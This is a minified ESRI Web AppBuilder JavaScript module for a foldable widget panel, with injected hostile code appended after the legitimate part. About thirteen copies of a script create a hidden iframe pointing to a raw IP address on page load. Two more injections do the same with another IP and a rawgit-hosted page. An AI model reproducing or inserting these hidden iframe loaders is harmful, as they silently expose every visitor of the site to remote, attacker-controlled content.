// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/html dojo/_base/array dojo/on dojo/aspect dojo/topic jimu/BaseWidgetPanel jimu/BaseWidgetFrame jimu/utils dojo/query dojo/dom-class ./FoldableDijit ./FoldableWidgetFrame dijit/registry".split(" "),function(l,g,b,h,k,m,e,n,p,q,d,f,r,t,u){return l([n,r],{baseClass:"jimu-panel jimu-foldable-dijit jimu-foldable-panel",closeTolerance:30,openAnimation:"fadeIn",closeAnimation:"fadeOut",animationDuration:500,startup:function(){this.titleHeight=35;this.inherited(arguments);
this._switchParentNode();b.addClass(this.titleNode,"jimu-panel-title");this.createCloseBtn();this.createMaxBtn();this.createFoldableBtn();this.panelManager.normalizePanel(this)},getPanelPosition:function(){var a;if(window.appInfo.isRunInMobile)return 0===this.panelManager.getPositionOnMobile(this).top?(a=this.panelManager.getPositionOnMobile(this),a.top="39px"):a=this.panelManager.getPositionOnMobile(this),a;a=g.clone(this.position);"undefined"===typeof a.width&&(a.width=360);"minimized"===this.windowState?
(a.bottom="auto",a.height=this.titleHeight,a.borderRadiusStyle={borderTopLeftRadius:"0px",borderTopRightRadius:"0px",borderBottomLeftRadius:0,borderBottomRightRadius:0}):(a.bottom=this.position.bottom,a.height="auto",a.borderRadiusStyle={borderTopLeftRadius:"0px",borderTopRightRadius:"0px",borderBottomLeftRadius:"0px",borderBottomRightRadius:"0px"});return a},onNormalize:function(){this.resize();f.contains(this.foldableNode,"folded")&&f.remove(this.foldableNode,"folded")},onMaximize:function(){this.resize();
f.contains(this.foldableNode,"folded")&&f.remove(this.foldableNode,"folded")},onMinimize:function(){this.resize();f.contains(this.foldableNode,"folded")||f.add(this.foldableNode,"folded")},resize:function(){this._switchMaxBtn();var a=this.getPanelPosition();"maximized"===this.windowState&&window.appInfo.isRunInMobile&&(a.top="39px");this._setMapCanvasArea(a.top);window.appInfo.isRunInMobile||(a.top="39px",a.right="0",a.bottom="0");this.position.zIndex&&(a.zIndex=this.position.zIndex);var c=q.getPositionStyle(a);
c.width=window.appInfo.isRunInMobile?760>=window.innerWidth||600>=window.innerHeight?"maximized"===this.windowState?"100%":760>=window.innerWidth?"100%":"360px":"360px":"360px";c.left=window.isRTL?"0px":"auto";c.right="0px"===c.left?"auto":c.right;g.mixin(c,a.borderRadiusStyle);b.setStyle(this.domNode,c);1<this.getChildren().length&&this._setFrameSize(a.contentHeight);this.inherited(arguments)},reloadWidget:function(a){this.inherited(arguments);this.isWidgetInPanel(a)&&(Array.isArray(this.config.widgets)||
this.setTitleLabel(a.label))},_setMapCanvasArea:function(a){if(window.appInfo.isRunInMobile){var c=0;d(".jimu-widget-attributetable")[0]&&(c=d(".jimu-widget-attributetable")[0].clientHeight);"minimized"===this.windowState?0<c&&35<c?e.publish("changeMapPosition",{bottom:c}):window.hasOwnProperty("ontouchstart")||void 0!==window.ontouchstart||760>=window.innerWidth?e.publish("changeMapPosition",{bottom:"35px"}):e.publish("changeMapPosition",{bottom:"0px"}):"maximized"===this.windowState?e.publish("changeMapPosition",
{bottom:"0px"}):0<c&&c>a?e.publish("changeMapPosition",{bottom:c}):window.hasOwnProperty("ontouchstart")||void 0!==window.ontouchstart||760>=window.innerWidth?e.publish("changeMapPosition",{bottom:a}):e.publish("changeMapPosition",{bottom:"0px"})}else window.appInfo.isRunInMobile||("minimized"===this.windowState?e.publish("changeMapPosition",{right:"0px"}):(e.publish("changeMapPosition",{right:"360px"}),this._resizeAttributeTableinRTL()))},_resizeAttributeTableinRTL:function(){d(".jimu-widget-attributetable")[0]&&
(window.isRTL?b.setStyle(d(".jimu-widget-attributetable")[0],"right","0px"):b.setStyle(d(".jimu-widget-attributetable")[0],"left","0px"),d(".dijitTabContainer",d(".jimu-widget-attributetable")[0])[0]&&u.byId(d(".dijitTabContainer",d(".jimu-widget-attributetable")[0])[0].id).resize())},updateConfig:function(a){this.inherited(arguments);this.setTitleLabel(a.label)},_switchMaxBtn:function(){window.appInfo.isRunInMobile&&(760>=window.innerWidth||600>=window.innerHeight)?b.setStyle(this.maxNode,"display",
""):b.setStyle(this.maxNode,"display","none")},_switchParentNode:function(){b.place(this.domNode,jimuConfig.layoutId)},_setFrameSize:function(a){var c,d=0;h.forEach(this.getChildren(),function(a){a.folded||d++},this);"undefined"===typeof a&&(a=b.getContentBox(this.containerNode).h);c=(a-(this.getChildren().length-d)*this.getChildren()[0].titleHeight)/d;h.forEach(this.getChildren(),function(a){a.folded?b.setStyle(a.domNode,{height:a.titleHeight+"px"}):b.setStyle(a.domNode,{height:c+"px"});a.resize()},
this)},createCloseBtn:function(){this.closeNode=b.create("div",{"class":"close-btn jimu-float-trailing"},this.titleNode);this.own(k(this.closeNode,"click",g.hitch(this,function(a){a.stopPropagation();d(".widget-open-symbol").addClass("esriCTHidden");this.panelManager.closePanel(this)})))},createMaxBtn:function(){this.maxNode=b.create("div",{"class":"max-btn jimu-float-trailing"},this.titleNode);this.own(k(this.maxNode,"click",g.hitch(this,function(a){a.stopPropagation();b.removeClass(this.titleNode,
"esriCTBorderBottom");this.onMaxNodeClick()})))},createFrame:function(a){this.config.widgets&&1===this.config.widgets.length||!this.config.widgets?a=new p:(a=new t({label:a.label,widgetManager:this.widgetManager}),m.after(a,"onFoldStateChanged",g.hitch(this,function(){var a=0;this._setFrameSize();h.forEach(this.getChildren(),function(b){b.folded||a++},this);h.forEach(this.getChildren(),function(b){b.foldEnable=b.folded||1!==a?!0:!1},this)})));return a},onFoldableNodeClick:function(){this.inherited(arguments);
"minimized"===this.windowState?(b.removeClass(this.titleNode,"esriCTBorderBottom"),this.panelManager.normalizePanel(this)):this.panelManager.minimizePanel(this)},onMaxNodeClick:function(){b.removeClass(this.titleNode,"esriCTBorderBottom");"maximized"===this.windowState?this.panelManager.normalizePanel(this):this.panelManager.maximizePanel(this)},moveTitle:function(){this.isFull?this.folded?b.setStyle(this.domNode,{top:b.getMarginBox(jimuConfig.layoutId).h-this.titleHeight+"px"}):b.setStyle(this.domNode,
{top:"0px"}):b.setStyle(this.domNode,{top:this.position.top+"px"})}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});